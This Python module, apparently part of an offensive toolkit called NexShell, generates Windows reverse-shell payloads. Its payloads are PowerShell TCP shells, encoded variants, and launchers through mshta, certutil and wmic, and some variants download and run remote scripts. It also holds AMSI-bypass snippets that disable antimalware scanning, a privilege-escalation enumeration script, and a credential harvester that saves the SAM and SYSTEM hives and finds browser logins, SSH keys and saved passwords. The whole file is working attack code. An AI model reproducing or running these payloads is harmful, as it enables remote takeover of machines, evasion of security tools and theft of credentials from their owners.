#!/usr/bin/env python3
"""
NexShell — Windows Support Module
Full PowerShell PTY upgrade, WinRM, living-off-the-land payloads,
AMSI bypass, Windows privilege escalation checks.
"""

import base64
import subprocess
import shutil


# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS PAYLOAD TEMPLATES
# ══════════════════════════════════════════════════════════════════════════════

def _ps_b64(code: str) -> str:
    """Encode a PowerShell command as UTF-16LE base64 (EncodedCommand)."""
    return base64.b64encode(code.encode('utf-16-le')).decode()


class WindowsPayloads:
    """Full Windows reverse shell payload arsenal."""

    @staticmethod
    def powershell_basic(host: str, port: int) -> str:
        cmd = (
            f"$client=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{0};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){"
            "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
            "$client.Close()"
        )
        return f"powershell -nop -NonI -ep bypass -c \"{cmd}\""

    @staticmethod
    def powershell_encoded(host: str, port: int) -> str:
        cmd = (
            f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()};"
            "$c.Close()"
        )
        encoded = _ps_b64(cmd)
        return f"powershell -nop -NonI -ep bypass -enc {encoded}"

    @staticmethod
    def conptyshell(host: str, port: int, rows: int = 24, cols: int = 80) -> str:
        """ConPtyShell — full interactive PTY on Windows."""
        setup = (
            "IEX(New-Object Net.WebClient).DownloadString("
            "'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1');"
        )
        invoke = f"Invoke-ConPtyShell -RemoteIp {host} -RemotePort {port} -Rows {rows} -Cols {cols}"
        encoded = _ps_b64(setup + invoke)
        return f"powershell -nop -NonI -ep bypass -enc {encoded}"

    @staticmethod
    def powershell_nishang(host: str, port: int) -> str:
        cmd = (
            "IEX(New-Object Net.WebClient).DownloadString("
            "'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');"
            f"Invoke-PowerShellTcp -Reverse -IPAddress {host} -Port {port}"
        )
        encoded = _ps_b64(cmd)
        return f"powershell -nop -NonI -ep bypass -enc {encoded}"

    @staticmethod
    def cmd_basic(host: str, port: int) -> str:
        return (
            f"cmd /c start /min powershell -nop -NonI -ep bypass -c "
            f"\"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$sb=([Text.Encoding]::ASCII).GetBytes($r+'> ');"
            "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
        )

    @staticmethod
    def mshta(host: str, port: int) -> str:
        """MSHTA payload — runs via mshta.exe (LOLBin)."""
        cmd = (
            f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$sb=([Text.Encoding]::ASCII).GetBytes($r+'> ');"
            "$s.Write($sb,0,$sb.Length)};$c.Close()"
        )
        encoded = _ps_b64(cmd)
        return f'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc {encoded}"",0:close")'

    @staticmethod
    def certutil(host: str, port: int) -> str:
        """Certutil base64-decode stager."""
        cmd = (
            f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$sb=([Text.Encoding]::ASCII).GetBytes($r+'> ');"
            "$s.Write($sb,0,$sb.Length)};$c.Close()"
        )
        b64 = base64.b64encode(cmd.encode()).decode()
        return (
            f'certutil -decode encoded.txt payload.ps1 & '
            f'echo {b64}> encoded.txt & '
            f'powershell -ep bypass -f payload.ps1'
        )

    @staticmethod
    def wmic(host: str, port: int) -> str:
        cmd = (
            f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$sb=([Text.Encoding]::ASCII).GetBytes($r+'> ');"
            "$s.Write($sb,0,$sb.Length)};$c.Close()"
        )
        encoded = _ps_b64(cmd)
        return f"wmic process call create \"powershell -nop -ep bypass -enc {encoded}\""

    @classmethod
    def all_payloads(cls, host: str, port: int) -> list:
        generators = [
            ('powershell (basic)',   cls.powershell_basic),
            ('powershell (encoded)', cls.powershell_encoded),
            ('conptyshell (PTY)',    cls.conptyshell),
            ('nishang',             cls.powershell_nishang),
            ('cmd.exe',             cls.cmd_basic),
            ('mshta (LOLBin)',      cls.mshta),
            ('wmic (LOLBin)',       cls.wmic),
        ]
        results = []
        for name, fn in generators:
            try:
                results.append({'name': name, 'payload': fn(host, port)})
            except Exception:
                pass
        return results


# ══════════════════════════════════════════════════════════════════════════════
#  AMSI BYPASS SNIPPETS
# ══════════════════════════════════════════════════════════════════════════════

AMSI_BYPASSES = {
    'patch_memory': (
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    ),
    'force_error': (
        "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
        "$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static');"
        "$c=$b.GetValue($null);"
        "[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41414141)"
    ),
    'script_block': (
        "$a='si';$b='Am';$c='Ut';$d='ils';"
        "[Ref].Assembly.GetType($b+$a+'Utils').GetField($b+$a+'InitFailed',"
        "'NonPublic,Static').SetValue($null,$true)"
    ),
    'com_object': (
        "$o=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
        "[Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,"
        "ContentType=WindowsRuntime] | Out-Null;"
        "$o.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    ),
}


def get_amsi_bypass(variant: str = 'patch_memory') -> str:
    return AMSI_BYPASSES.get(variant, AMSI_BYPASSES['patch_memory'])


# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS PRIVILEGE ESCALATION CHECKS
# ══════════════════════════════════════════════════════════════════════════════

WINDOWS_PRIVESC_SCRIPT = r"""
Write-Host "`n=== [NexShell] Windows PrivEsc Advisor ===" -ForegroundColor Cyan

# Current user info
Write-Host "`n--- User Info ---" -ForegroundColor Yellow
whoami /all

# OS info
Write-Host "`n--- OS Version ---" -ForegroundColor Yellow
[System.Environment]::OSVersion.Version
Get-WmiObject -Class Win32_OperatingSystem | Select Caption,Version,BuildNumber

# Check for AlwaysInstallElevated
Write-Host "`n--- AlwaysInstallElevated ---" -ForegroundColor Yellow
$aie1 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aie2 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if($aie1 -eq 1 -and $aie2 -eq 1){ Write-Host "[!] AlwaysInstallElevated ENABLED" -ForegroundColor Red }
else { Write-Host "[OK] AlwaysInstallElevated not set" -ForegroundColor Green }

# Check for unquoted service paths
Write-Host "`n--- Unquoted Service Paths ---" -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {$_.StartMode -ne "Disabled" -and $_.PathName -notmatch '"' -and $_.PathName -match " "} | Select Name,PathName

# Check writable service binaries
Write-Host "`n--- Writable Service Binaries ---" -ForegroundColor Yellow
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -split '"')[1]; if(!$path){$path=$_.PathName.Split(' ')[0]}
    if($path -and (Test-Path $path)){
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if($acl){
            $acl.Access | Where-Object {($_.IdentityReference -match 'Everyone|Users|Authenticated') -and ($_.FileSystemRights -match 'Write|FullControl')} |
            ForEach-Object { Write-Host "[!] Writable: $path" -ForegroundColor Red }
        }
    }
}

# Check scheduled tasks
Write-Host "`n--- Interesting Scheduled Tasks ---" -ForegroundColor Yellow
schtasks /query /fo LIST /v 2>$null | Select-String -Pattern "Task To Run|Run As User" -Context 0,1

# Check token privileges
Write-Host "`n--- Token Privileges ---" -ForegroundColor Yellow
whoami /priv

# Check installed software
Write-Host "`n--- Installed Software (potential exploits) ---" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Product | Select Name,Version | Sort-Object Name | Select-Object -First 30

# Check for password in registry
Write-Host "`n--- Autologon Credentials ---" -ForegroundColor Yellow
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | Select DefaultUserName,DefaultPassword

Write-Host "`n=== [Done] ===" -ForegroundColor Cyan
"""

WINDOWS_CRED_HARVEST = r"""
Write-Host "`n=== [NexShell] Windows CredentialHarvester ===" -ForegroundColor Cyan

# SAM and SYSTEM hives (if accessible)
Write-Host "`n--- Registry Hive Dump Attempt ---" -ForegroundColor Yellow
try { reg save HKLM\SAM C:\Windows\Temp\sam.bak 2>$null; Write-Host "[+] SAM saved" } catch {}
try { reg save HKLM\SYSTEM C:\Windows\Temp\system.bak 2>$null; Write-Host "[+] SYSTEM saved" } catch {}

# Windows Credential Manager
Write-Host "`n--- Credential Manager ---" -ForegroundColor Yellow
cmdkey /list 2>$null

# Browser credential files
Write-Host "`n--- Browser Credential Files ---" -ForegroundColor Yellow
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
)
foreach($p in $paths){ if(Test-Path $p){ Write-Host "[+] Found: $p" -ForegroundColor Green } }

# SSH keys
Write-Host "`n--- SSH Keys ---" -ForegroundColor Yellow
Get-ChildItem -Recurse -ErrorAction SilentlyContinue "$env:USERPROFILE\.ssh" | Select FullName

# Config files with passwords
Write-Host "`n--- Password in Config Files ---" -ForegroundColor Yellow
Get-ChildItem -Recurse -Include *.xml,*.ini,*.conf,*.config -ErrorAction SilentlyContinue C:\inetpub,C:\xampp,C:\wamp |
Where-Object {Select-String -Path $_ -Pattern "password|passwd|secret|credentials" -Quiet} |
Select FullName | Select-Object -First 20

# WinSCP saved sessions
Write-Host "`n--- WinSCP Sessions ---" -ForegroundColor Yellow
Get-ItemProperty "HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\*" -ErrorAction SilentlyContinue |
Select PSChildName,HostName,UserName,Password

# PowerShell history
Write-Host "`n--- PowerShell History ---" -ForegroundColor Yellow
$histpath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if(Test-Path $histpath){ Get-Content $histpath | Select-Object -Last 50 }

Write-Host "`n=== [Done] ===" -ForegroundColor Cyan
"""

WINDOWS_QUICKENUM = r"""
Write-Host "`n=== [NexShell] Windows QuickEnum ===" -ForegroundColor Cyan

Write-Host "`n--- System Info ---" -ForegroundColor Yellow
$cs = Get-WmiObject Win32_ComputerSystem
Write-Host "Hostname: $($cs.Name)  Domain: $($cs.Domain)"
[System.Environment]::OSVersion | Select VersionString

Write-Host "`n--- Current User ---" -ForegroundColor Yellow
whoami; whoami /groups | Select-String "Domain\|LOCAL\|BUILTIN"

Write-Host "`n--- Local Admins ---" -ForegroundColor Yellow
net localgroup administrators 2>$null

Write-Host "`n--- Network Interfaces ---" -ForegroundColor Yellow
ipconfig /all | Select-String "IPv4|Adapter"

Write-Host "`n--- Open Ports ---" -ForegroundColor Yellow
netstat -ano | Select-String "LISTENING" | Select-Object -First 20

Write-Host "`n--- Running Processes (interesting) ---" -ForegroundColor Yellow
Get-Process | Where-Object {$_.Name -match "av|antivirus|defender|mcafee|norton|kaspersky|sophos|crowdstrike|sentinel"} | Select Name,Id

Write-Host "`n--- AV Detection ---" -ForegroundColor Yellow
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select displayName,productState

Write-Host "`n--- Shares ---" -ForegroundColor Yellow
net share 2>$null

Write-Host "`n--- Domain Info ---" -ForegroundColor Yellow
$domain = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
if($domain){ nltest /domain_trusts 2>$null; net user /domain 2>$null | Select-Object -First 20 }
else { Write-Host "Not domain-joined" }

Write-Host "`n=== [Done] ===" -ForegroundColor Cyan
"""
